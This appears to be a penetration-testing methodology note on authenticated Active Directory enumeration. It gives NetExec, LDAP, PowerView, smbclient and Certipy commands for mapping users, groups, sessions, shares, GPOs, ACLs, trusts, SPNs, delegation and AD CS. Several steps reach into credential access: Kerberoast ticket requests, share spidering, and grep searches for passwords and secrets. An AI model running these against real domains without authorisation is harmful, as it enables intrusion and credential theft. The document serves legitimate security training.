# Authenticated Enumeration

Authenticated enumeration starts after obtaining at least one valid domain credential.

A low-privileged domain user can usually read a lot of directory information. The goal is to map the domain, identify users, groups, computers, sessions, shares, policies, ACLs, trusts, SPNs, delegation settings, AD CS objects, and BloodHound attack paths.

Basic variables used in examples:

```bash
export DOMAIN=corp.local
export NETBIOS=CORP
export USER=alice
export PASS='Password123!'
export DC_IP=10.10.10.10
export DC_HOST=dc01.corp.local
export TARGET=10.10.10.10
export RANGE=10.10.10.0/24
```

Hash-based examples use:

```bash
export NTLM='8846f7eaee8fb117ad06bdd830b7586c'
```

Useful resources:

- [HackTricks - Active Directory Methodology](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)
- [The Hacker Recipes - Active Directory](https://www.thehacker.recipes/ad/)
- [NetExec Documentation](https://www.netexec.wiki/)
- [BloodHound CE Documentation](https://bloodhound.specterops.io/)
- [SharpHound CE Documentation](https://bloodhound.specterops.io/collect-data/ce-collection/sharphound)
- [Certipy](https://github.com/ly4k/Certipy)
- [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
- [Impacket](https://github.com/fortra/impacket)
- [WADComs](https://wadcoms.github.io/)

---

## Domain Context

Domain context is the first authenticated step.

The goal is to confirm where the credential works, what the domain is called, which domain controllers exist, what the domain SID is, what the password policy looks like, and whether LDAP/SMB/WinRM access is available.

**Validate credentials**

```bash
nxc smb $DC_IP -u $USER -p "$PASS" -d $DOMAIN
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN
nxc winrm $RANGE -u $USER -p "$PASS" -d $DOMAIN
```

With NTLM hash:

```bash
nxc smb $DC_IP -u $USER -H $NTLM -d $DOMAIN
nxc ldap $DC_IP -u $USER -H $NTLM -d $DOMAIN
```

With Kerberos:

```bash
nxc smb $DC_HOST -u $USER -p "$PASS" -d $DOMAIN -k
nxc ldap $DC_HOST -u $USER -p "$PASS" -d $DOMAIN -k
```

**Basic domain information**

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --get-sid
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --dc-list
```

LDAP RootDSE:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" -s base +
```

Useful RootDSE fields:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" -s base \
defaultNamingContext rootDomainNamingContext configurationNamingContext schemaNamingContext dnsHostName ldapServiceName
```

PowerView:

```powershell
Get-Domain
Get-DomainController
Get-DomainPolicyData
Get-DomainSID
```

Active Directory PowerShell module:

```powershell
Get-ADDomain
Get-ADForest
Get-ADDomainController -Filter *
```

**Password policy**

```bash
nxc smb $DC_IP -u $USER -p "$PASS" -d $DOMAIN --pass-pol
```

PowerView:

```powershell
Get-DomainPolicyData | Select-Object -ExpandProperty SystemAccess
```

AD module:

```powershell
Get-ADDefaultDomainPasswordPolicy
```

Look for:

| Field | Why it matters |
| --- | --- |
| Domain name | Needed for tools and Kerberos realm. |
| NetBIOS name | Needed for SMB/RPC style authentication. |
| Domain SID | Useful for SID/RID interpretation. |
| DC list | Identifies all domain controllers. |
| Password policy | Important before any password testing. |
| Lockout threshold | Determines spray risk. |
| MachineAccountQuota | Shows whether normal users can create machine accounts. |
| Forest name | Important in multi-domain environments. |
| Functional level | Gives context about AD feature set. |


---

## Users

User enumeration identifies domain accounts, naming patterns, descriptions, account flags, password metadata, SPNs, admin-related attributes, and possible service accounts.

**NetExec**

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --users
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --active-users
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --users-export users.txt
```

User descriptions:

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN -M get-desc-users
```

**LDAP**

All users:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user))" \
sAMAccountName userPrincipalName description memberOf pwdLastSet lastLogonTimestamp userAccountControl servicePrincipalName
```

Only enabled users:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
sAMAccountName userPrincipalName
```

Users with descriptions:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(description=*))" \
sAMAccountName description
```

Users with SPNs:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))" \
sAMAccountName servicePrincipalName
```

Users with Kerberos pre-auth disabled:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
sAMAccountName userPrincipalName
```

Password never expires:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))" \
sAMAccountName userPrincipalName
```

AdminCount users:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(adminCount=1))" \
sAMAccountName memberOf
```

**Impacket**

```bash
GetADUsers.py $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP -all
```

**PowerView**

```powershell
Get-DomainUser
Get-DomainUser -Identity alice
Get-DomainUser -SPN
Get-DomainUser -AdminCount
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
Get-DomainUser -UACFilter PASSWD_NOTREQD
Get-DomainUser -UACFilter DONT_EXPIRE_PASSWORD
```

Useful formatting:

```powershell
Get-DomainUser | Select-Object samaccountname,description,lastlogontimestamp,pwdlastset,memberof
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname
```

**Interesting user fields**

| Field | Why it matters |
| --- | --- |
| `sAMAccountName` | Username for most tools. |
| `userPrincipalName` | UPN logon format. |
| `description` | Sometimes contains role hints or secrets in labs. |
| `memberOf` | Group membership. |
| `servicePrincipalName` | Service account indicator. |
| `pwdLastSet` | Password age. |
| `lastLogonTimestamp` | Approximate activity. |
| `userAccountControl` | Account behavior flags. |
| `adminCount` | Possible protected/privileged history. |
| `badPwdCount` | Bad password count. |
| `logonCount` | Activity clue. |

**User list cleanup**

```bash
cat users.txt | tr '[:upper:]' '[:lower:]' | sort -u > users_clean.txt
```

Extract usernames from LDAP output:

```bash
grep -i "sAMAccountName:" ldap_users.txt | awk '{print $2}' | sort -u > users.txt
```


---

## Groups

Group enumeration maps privilege structure.

Groups are important because users often gain access through direct or nested membership rather than direct permissions.

**NetExec**

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --groups
```

Members of a specific group:

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --groups "Domain Admins"
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --groups "Enterprise Admins"
```

**LDAP**

All groups:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(objectClass=group)" cn distinguishedName member description groupType
```

Specific group:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(&(objectClass=group)(cn=Domain Admins))" cn member
```

Groups with names suggesting privilege:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(&(objectClass=group)(|(cn=*admin*)(cn=*operator*)(cn=*backup*)(cn=*helpdesk*)(cn=*it*)))" \
cn member description
```

**PowerView**

```powershell
Get-DomainGroup
Get-DomainGroup -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Enterprise Admins"
Get-DomainGroupMember -Identity "Administrators"
```

Recursive membership:

```powershell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

Groups for a user:

```powershell
Get-DomainUser -Identity alice | Select-Object -ExpandProperty memberof
```

**AD module**

```powershell
Get-ADGroup -Filter *
Get-ADGroupMember "Domain Admins" -Recursive
Get-ADPrincipalGroupMembership alice
```

**Groups worth checking**

| Group | Why it matters |
| --- | --- |
| `Domain Admins` | High privilege in the domain. |
| `Enterprise Admins` | High privilege across the forest. |
| `Schema Admins` | Can modify schema. |
| `Administrators` | Built-in privileged group. |
| `Account Operators` | Account management privileges. |
| `Server Operators` | Server/DC management context. |
| `Backup Operators` | Backup/restore-related privileges. |
| `Print Operators` | Printer-related privileges on DCs. |
| `Remote Desktop Users` | RDP access. |
| `Remote Management Users` | WinRM access. |
| `DnsAdmins` | DNS admin context. |
| `Group Policy Creator Owners` | GPO creation rights. |
| `Helpdesk` | Often delegated access. |
| `IT` / `Support` | Often operational privileges. |

**Nested membership**

Example:

```text
alice
  -> Helpdesk
  -> IT Admins
  -> Server Operators
```

Nested groups can hide privilege paths.

Always check recursive group membership when possible.



---

## Computers

Computer enumeration maps domain-joined hosts.

Computer objects help identify workstations, servers, DCs, operating systems, naming conventions, SPNs, delegation flags, and possible lateral movement targets.

**NetExec**

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --computers
```

SMB sweep:

```bash
nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN
```

**LDAP**

All computers:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(objectClass=computer)" \
sAMAccountName dNSHostName operatingSystem operatingSystemVersion servicePrincipalName memberOf userAccountControl lastLogonTimestamp
```

Enabled computers:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
sAMAccountName dNSHostName operatingSystem
```

Domain controllers:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" \
sAMAccountName dNSHostName
```

Windows servers:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(&(objectClass=computer)(operatingSystem=*Server*))" \
sAMAccountName dNSHostName operatingSystem
```

Computers with SPNs:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(&(objectClass=computer)(servicePrincipalName=*))" \
sAMAccountName dNSHostName servicePrincipalName
```

**PowerView**

```powershell
Get-DomainComputer
Get-DomainComputer -OperatingSystem "*Server*"
Get-DomainComputer -Unconstrained
Get-DomainComputer -TrustedToAuth
Get-DomainController
```

Useful formatting:

```powershell
Get-DomainComputer | Select-Object samaccountname,dnshostname,operatingsystem,lastlogontimestamp
```

**AD module**

```powershell
Get-ADComputer -Filter * -Properties dNSHostName,OperatingSystem,OperatingSystemVersion,lastLogonTimestamp,servicePrincipalName
Get-ADDomainController -Filter *
```

**Host role hints**

| Pattern | Possible role |
| --- | --- |
| `DC01`, `AD01` | Domain controller. |
| `FS01`, `FILE01` | File server. |
| `SQL01`, `DB01` | Database server. |
| `WEB01`, `IIS01` | Web server. |
| `APP01` | Application server. |
| `CA01`, `PKI01` | AD CS / certificate services. |
| `SCCM01`, `MECM01` | Endpoint management. |
| `WSUS01` | Update server. |
| `JUMP01`, `PAW01` | Admin/jump workstation. |
| `BACKUP01` | Backup server. |



---

## Sessions

Session enumeration tries to identify where users are logged in or where user context exists.

This is important because a machine with a privileged user session can become more valuable than its hostname suggests.

Session data can come from SMB/RPC, Remote Registry, WinRM, RDP session info, BloodHound collection, or local access.

**NetExec logged-on users**

Workstation service method:

```bash
nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN --loggedon-users
```

Hunt for a specific user:

```bash
nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN --loggedon-users administrator
```

Remote Registry method:

```bash
nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN --reg-sessions
```

RDP session query:

```bash
nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN --qwinsta
```

**PowerView**

```powershell
Find-DomainUserLocation
Find-DomainUserLocation -UserIdentity alice
Get-NetSession -ComputerName FILE01
Get-NetLoggedon -ComputerName FILE01
Get-LoggedOnLocal -ComputerName FILE01
```

**Windows built-ins**

On a host you can access:

```cmd
query user
qwinsta
whoami
whoami /groups
net session
```

Remote query if allowed:

```cmd
qwinsta /server:HOSTNAME
```

**Session interpretation**

| Finding | Meaning |
| --- | --- |
| Low-privileged user on workstation | Normal user activity. |
| Admin user on workstation | Potentially interesting target. |
| Domain Admin on server | High-value session. |
| Service account session | May indicate running service or scheduled task. |
| RDP active session | Interactive user context. |
| Registry session | Loaded profile, not always interactive. |

**Important distinction**

`--loggedon-users`, `--reg-sessions`, and `--qwinsta` do not show the exact same thing.

| Method | What it suggests |
| --- | --- |
| `--loggedon-users` | Logged-on users from workstation service. |
| `--reg-sessions` | Loaded user registry hives / profile context. |
| `--qwinsta` | Interactive RDP/terminal sessions. |
| BloodHound Session | Session relationships collected by SharpHound. |



---

## Shares

Share enumeration identifies accessible SMB shares and files.

After getting a valid domain user, share access usually expands beyond anonymous or guest access.

**NetExec**

List shares:

```bash
nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN --shares
```

Only readable or writable shares:

```bash
nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN --shares READ
nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN --shares WRITE
nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN --shares READ,WRITE
```

Spider shares:

```bash
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN --spider SHARENAME
```

Spider and search for patterns:

```bash
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN --spider SHARENAME --pattern pass
```

**smbmap**

```bash
smbmap -H $TARGET -d $DOMAIN -u $USER -p "$PASS"
smbmap -H $TARGET -d $DOMAIN -u $USER -p "$PASS" -R
```

Download a file:

```bash
smbmap -H $TARGET -d $DOMAIN -u $USER -p "$PASS" --download 'SHARE\\path\\file.txt'
```

**smbclient**

List shares:

```bash
smbclient -L //$TARGET/ -U "$DOMAIN/$USER%$PASS"
```

Connect to share:

```bash
smbclient //$TARGET/SHARENAME -U "$DOMAIN/$USER%$PASS"
```

Recursive listing:

```bash
smbclient //$TARGET/SHARENAME -U "$DOMAIN/$USER%$PASS" -c 'recurse ON; ls'
```

Recursive download in labs when allowed:

```bash
smbclient //$TARGET/SHARENAME -U "$DOMAIN/$USER%$PASS" -c 'recurse ON; prompt OFF; mget *'
```

**Common shares**

| Share | Why it matters |
| --- | --- |
| `SYSVOL` | GPO files, scripts, policies. |
| `NETLOGON` | Logon scripts. |
| `Users` | User folders. |
| `Home` | Home directories. |
| `Shared` | General shared files. |
| `IT` | Scripts, tools, docs. |
| `Backups` | Backup archives and configs. |
| `Software` | Deployment packages and scripts. |
| `Projects` | Application configs and docs. |
| `HR` | Names and user data. |
| `Finance` | Sensitive business files. |

**Interesting extensions**

```text
*.txt
*.csv
*.xml
*.json
*.config
*.conf
*.ini
*.yml
*.yaml
*.ps1
*.bat
*.cmd
*.vbs
*.sql
*.bak
*.zip
*.7z
*.kdbx
*.rdp
*.ppk
*.pem
*.key
```

**Local search after download**

```bash
grep -RniE "password|passwd|pwd|cred|secret|token|apikey|api_key|connectionstring|login|user" .
find . -iname "*.kdbx" -o -iname "*.config" -o -iname "*.xml" -o -iname "*.ps1" -o -iname "*.ini" -o -iname "*.sql"
```



---

## GPOs

Group Policy Objects connect AD structure with endpoint configuration.

GPO enumeration can reveal scripts, local group settings, drive mappings, scheduled tasks, registry preferences, software deployment, and policy links to OUs.

**SYSVOL**

List SYSVOL:

```bash
smbclient //$DC_IP/SYSVOL -U "$DOMAIN/$USER%$PASS" -c 'recurse ON; ls'
```

Mount SYSVOL:

```bash
sudo mkdir -p /mnt/sysvol
sudo mount -t cifs //$DC_IP/SYSVOL /mnt/sysvol -o username=$USER,password="$PASS",domain=$DOMAIN
```

Find interesting files:

```bash
find /mnt/sysvol -type f
find /mnt/sysvol -type f \( -iname "*.xml" -o -iname "*.ps1" -o -iname "*.bat" -o -iname "*.cmd" -o -iname "*.vbs" -o -iname "*.ini" \)
grep -RniE "password|passwd|pwd|cred|secret|user|login|administrator" /mnt/sysvol
```

**PowerView**

```powershell
Get-DomainGPO
Get-DomainGPO -Identity "{GUID}"
Get-DomainGPOLocalGroup
Get-DomainGPOUserLocalGroupMapping
Get-DomainOU -GPLink "*"
```

GPOs applied to a user or computer:

```powershell
Get-DomainGPO -UserIdentity alice
Get-DomainGPO -ComputerIdentity WS01
```

Find OUs with linked GPOs:

```powershell
Get-DomainOU | Select-Object name,gplink
```

**AD module**

```powershell
Get-GPO -All
Get-GPInheritance -Target "OU=Workstations,DC=corp,DC=local"
```

**Common GPO file locations**

```text
\\corp.local\SYSVOL\corp.local\Policies\{GPO-GUID}\Machine\
\\corp.local\SYSVOL\corp.local\Policies\{GPO-GUID}\User\
```

Interesting paths:

```text
Machine\Scripts\
User\Scripts\
Machine\Preferences\
User\Preferences\
Machine\Microsoft\Windows NT\SecEdit\
```

Interesting files:

| File | Why it matters |
| --- | --- |
| `Groups.xml` | Local group preferences. |
| `Services.xml` | Service configuration. |
| `ScheduledTasks.xml` | Scheduled tasks. |
| `Drives.xml` | Drive mappings. |
| `DataSources.xml` | Database connections. |
| `Registry.xml` | Registry preference data. |
| `scripts.ini` | Startup/logon script references. |
| `GptTmpl.inf` | Security template settings. |



---

## ACLs

ACL enumeration identifies object-level permissions in Active Directory.

This is where relationships such as `GenericAll`, `GenericWrite`, `WriteDACL`, `WriteOwner`, `AddMember`, and `ForceChangePassword` become visible.

This section is only enumeration. Actual abuse belongs to ACL abuse notes.

**Important terms**

| Term | Meaning |
| --- | --- |
| ACL | Access Control List. |
| ACE | Access Control Entry. |
| DACL | Discretionary ACL controlling access. |
| SACL | System ACL used for auditing. |
| Owner | Object owner. |
| Trustee / Principal | User, group, or computer receiving rights. |
| Rights | Permissions granted or denied. |

**PowerView**

All ACLs for an object:

```powershell
Get-DomainObjectAcl -Identity alice -ResolveGUIDs
```

ACLs for a group:

```powershell
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
```

Find interesting domain ACLs:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs
```

Find ACLs where current user has rights:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReference -match "$env:USERNAME"}
```

Check object owner:

```powershell
Get-DomainObjectAcl -Identity alice -ResolveGUIDs | Select-Object ObjectDN,ActiveDirectoryRights,IdentityReference,ObjectAceType
```

**BloodHound-style rights to look for**

| Right | Why it matters |
| --- | --- |
| `GenericAll` | Full control over object. |
| `GenericWrite` | Can modify many useful attributes. |
| `WriteDACL` | Can modify permissions. |
| `WriteOwner` | Can take ownership path. |
| `AllExtendedRights` | May include powerful extended rights. |
| `ForceChangePassword` | Can reset target user's password. |
| `AddMember` | Can add members to a group. |
| `AddSelf` | Principal can add itself to a group. |
| `ReadLAPSPassword` | Can read LAPS-managed local admin password. |
| `AllowedToAct` | RBCD-related relationship. |
| `WriteSPN` | Can modify SPNs. |
| `WriteAccountRestrictions` | Can affect delegation/account settings. |

**LDAP security descriptor query**

Reading raw security descriptors with LDAP is less comfortable than using PowerView or BloodHound, but useful attributes include:

```text
nTSecurityDescriptor
msDS-AllowedToActOnBehalfOfOtherIdentity
adminCount
owner
```

Example query for RBCD-related attribute:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" \
sAMAccountName msDS-AllowedToActOnBehalfOfOtherIdentity
```

**Useful ACL targets**

| Target type | Why it matters |
| --- | --- |
| Users | Password reset, SPN write, shadow credential paths. |
| Groups | AddMember / AddSelf paths. |
| Computers | RBCD, local admin paths, LAPS read. |
| OUs | Inherited rights over child objects. |
| GPOs | Policy control paths. |
| Domain root | Replication rights and high-impact permissions. |
| Certificate templates | AD CS escalation paths. |



---

## Trusts

Trust enumeration identifies relationships between domains and forests.

Trusts matter because users from one domain may access resources in another domain depending on trust direction, transitivity, SID filtering, and selective authentication.

**NetExec**

List DCs and trust context:

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --dc-list
```

Domain trusts:

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --trusted-for-delegation
```

Some trust enumeration may require BloodHound, PowerView, or AD module for cleaner output.

**PowerView**

```powershell
Get-DomainTrust
Get-DomainTrustMapping
Get-Forest
Get-ForestDomain
Get-ForestTrust
```

Trusts for a specific domain:

```powershell
Get-DomainTrust -Domain corp.local
```

**AD module**

```powershell
Get-ADTrust -Filter *
Get-ADForest
(Get-ADForest).Domains
```

**nltest**

```cmd
nltest /domain_trusts
nltest /dclist:corp.local
nltest /dsgetdc:corp.local
```

**LDAP**

Trusted domain objects:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "CN=System,DC=corp,DC=local" "(objectClass=trustedDomain)" \
cn trustPartner trustDirection trustType trustAttributes flatName securityIdentifier
```

**Trust fields**

| Field | Meaning |
| --- | --- |
| Trust partner | Other domain or forest. |
| Trust direction | Inbound, outbound, or bidirectional. |
| Trust type | Parent-child, external, forest, etc. |
| Transitive | Whether trust extends beyond direct trust. |
| SID filtering | Affects SID-based abuse paths. |
| Selective authentication | Limits access across trust. |
| Forest trust | Trust between forests. |
| External trust | Trust with external domain. |

**Direction reminder**

| Direction | Meaning |
| --- | --- |
| Inbound trust | Other domain trusts this domain's users. |
| Outbound trust | This domain trusts other domain's users. |
| Bidirectional | Both directions. |

Trust direction can be confusing. Always verify with tool output and target access.


---

## SPNs

SPN enumeration identifies accounts associated with Kerberos services.

SPNs are important because they reveal service accounts, service locations, and Kerberos service-ticket targets.

This section only covers enumeration. Kerberoasting itself belongs to credential access / Kerberos attack notes.

**NetExec**

Kerberoast-style SPN discovery:

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --kerberoasting kerberoast_hashes.txt
```

This can request roastable tickets, so treat it as credential-access activity if the rules of engagement separate enumeration from ticket requests.

For pure LDAP-style discovery, use LDAP queries.

**LDAP**

Users with SPNs:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))" \
sAMAccountName servicePrincipalName memberOf pwdLastSet lastLogonTimestamp
```

Computers with SPNs:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(&(objectClass=computer)(servicePrincipalName=*))" \
sAMAccountName dNSHostName servicePrincipalName
```

**PowerView**

```powershell
Get-DomainUser -SPN
Get-DomainComputer -SPN
```

Useful output:

```powershell
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname,pwdlastset,lastlogontimestamp,memberof
```

**AD module**

```powershell
Get-ADUser -LDAPFilter "(servicePrincipalName=*)" -Properties servicePrincipalName,memberOf,pwdLastSet,lastLogonTimestamp
Get-ADComputer -LDAPFilter "(servicePrincipalName=*)" -Properties servicePrincipalName,dNSHostName,operatingSystem
```

**Common SPNs**

| SPN class | Common meaning |
| --- | --- |
| `MSSQLSvc` | Microsoft SQL Server. |
| `HTTP` | Web service. |
| `CIFS` | SMB/file service. |
| `HOST` | Generic host services. |
| `LDAP` | LDAP service. |
| `TERMSRV` | RDP/terminal service. |
| `WSMAN` | WinRM. |
| `DNS` | DNS service. |
| `Exchange` / `exchangeMDB` | Exchange. |
| `FIMService` | Microsoft Identity Manager. |

**SPN interpretation**

| Finding | Meaning |
| --- | --- |
| SPN on user account | Likely service account. |
| SPN on computer account | Common for host services. |
| MSSQL SPN | SQL target. |
| HTTP SPN | Web app/service account target. |
| Old password date | May suggest weak password hygiene. |
| Privileged group membership | Higher-value service account. |
| Many SPNs on one user | Broad service usage. |


---

## Delegation

Delegation enumeration identifies accounts and computers allowed to delegate Kerberos authentication.

Delegation is important because misconfigured delegation can create privilege paths.

This section only covers discovery and interpretation.

**Delegation types**

| Type | Meaning |
| --- | --- |
| Unconstrained delegation | Service can receive forwarded TGTs. |
| Constrained delegation | Service can delegate to specific services. |
| Resource-Based Constrained Delegation | Target resource defines who can act on its behalf. |

**LDAP flags and attributes**

| Attribute / flag | Meaning |
| --- | --- |
| `TRUSTED_FOR_DELEGATION` | Unconstrained delegation. |
| `TRUSTED_TO_AUTH_FOR_DELEGATION` | Protocol transition / constrained delegation. |
| `msDS-AllowedToDelegateTo` | Services allowed for constrained delegation. |
| `msDS-AllowedToActOnBehalfOfOtherIdentity` | RBCD target-side attribute. |
| `AccountNotDelegated` | Account marked sensitive and not delegable. |

**NetExec**

Unconstrained delegation:

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --trusted-for-delegation
```

Misconfigured delegation module:

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --find-delegation
```

**LDAP**

Unconstrained delegation:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(userAccountControl:1.2.840.113556.1.4.803:=524288)" \
sAMAccountName dNSHostName servicePrincipalName userAccountControl
```

Constrained delegation:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(msDS-AllowedToDelegateTo=*)" \
sAMAccountName dNSHostName msDS-AllowedToDelegateTo userAccountControl
```

Protocol transition flag:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(userAccountControl:1.2.840.113556.1.4.803:=16777216)" \
sAMAccountName dNSHostName userAccountControl msDS-AllowedToDelegateTo
```

RBCD:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" \
sAMAccountName dNSHostName msDS-AllowedToActOnBehalfOfOtherIdentity
```

Sensitive and not delegated users:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(userAccountControl:1.2.840.113556.1.4.803:=1048576)" \
sAMAccountName userAccountControl
```

**PowerView**

```powershell
Get-DomainComputer -Unconstrained
Get-DomainUser -Unconstrained
Get-DomainComputer -TrustedToAuth
Get-DomainUser -TrustedToAuth
Get-DomainObject -LDAPFilter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"
```


---

## ADCS Enumeration

AD CS enumeration identifies certificate authorities, certificate templates, enrollment rights, and certificate-based authentication paths.

AD CS is often high-value in AD environments because certificate templates and CA permissions can create authentication or privilege escalation paths.

This section focuses on enumeration.

**Certipy**

Basic find:

```bash
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip $DC_IP
```

Verbose output:

```bash
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip $DC_IP -v
```

Show vulnerable paths:

```bash
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip $DC_IP -vulnerable
```

Generate BloodHound output:

```bash
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip $DC_IP -bloodhound
```

Output files commonly include:

```text
*_Certipy.txt
*_Certipy.json
*_Certipy.zip
```

With hash:

```bash
certipy find -u "$USER@$DOMAIN" -hashes :$NTLM -dc-ip $DC_IP -vulnerable
```

**NetExec AD CS checks**

ESC8-related check:

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN -M adcs
```

**LDAP**

Find Enterprise CAs:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
"(objectClass=pKIEnrollmentService)" cn dNSHostName certificateTemplates
```

Find certificate templates:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
"(objectClass=pKICertificateTemplate)" cn displayName pKIExtendedKeyUsage msPKI-Certificate-Name-Flag msPKI-Enrollment-Flag
```

**Windows**

Certutil:

```cmd
certutil -config - -ping
certutil -template
certutil -catemplates
```

Certify:

```cmd
Certify.exe find
Certify.exe find /vulnerable
```

**Interesting AD CS fields**

| Field | Meaning |
| --- | --- |
| CA name | Certificate Authority name. |
| CA hostname | Server hosting the CA. |
| Template name | Certificate template. |
| Enabled templates | Templates issued by the CA. |
| Enrollment rights | Who can request certificates. |
| EKU | Certificate usage. |
